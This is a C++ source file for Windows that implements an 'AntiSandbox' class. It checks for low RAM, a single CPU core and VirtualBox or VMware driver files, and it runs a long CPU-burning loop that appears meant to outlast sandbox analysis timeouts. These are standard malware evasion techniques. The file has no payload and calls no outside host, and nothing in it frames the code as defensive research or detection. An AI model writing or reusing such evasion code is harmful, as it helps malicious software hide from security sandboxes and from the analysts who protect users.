#include "AntiSandbox.hpp"

bool AntiSandbox::IsLowResources() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    if (!GlobalMemoryStatusEx(&statex)) return false;

    float ramGB = static_cast<float>(statex.ullTotalPhys) / (1024.0f * 1024.0f * 1024.0f);
    return ramGB < 4.0f; 
}

bool AntiSandbox::IsSingleCore() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    return sysInfo.dwNumberOfProcessors < 2;
}

bool AntiSandbox::IsVirtualMachine() {
    const std::string_view artifacts[] = {
        "C:\\windows\\System32\\Drivers\\VBoxMouse.sys",
        "C:\\windows\\System32\\Drivers\\vmmouse.sys",
        "C:\\windows\\System32\\Drivers\\vmhgfs.sys"
    };

    for (const auto& path : artifacts) {
        if (std::filesystem::exists(path)) {
            return true;
        }
    }
    return false;
}

void AntiSandbox::ExecuteHeavyDelay(long long iterations) {
    double dummy = 0.0;
    
    for (long long i = 0; i < iterations; ++i) {
        dummy += std::sin(i) * std::cos(i);
        dummy = std::sqrt(std::abs(dummy + 1.0));
    }

    if (dummy == 0.0001) { 
        std::cout << "Algo impossível aconteceu"; 
    }
}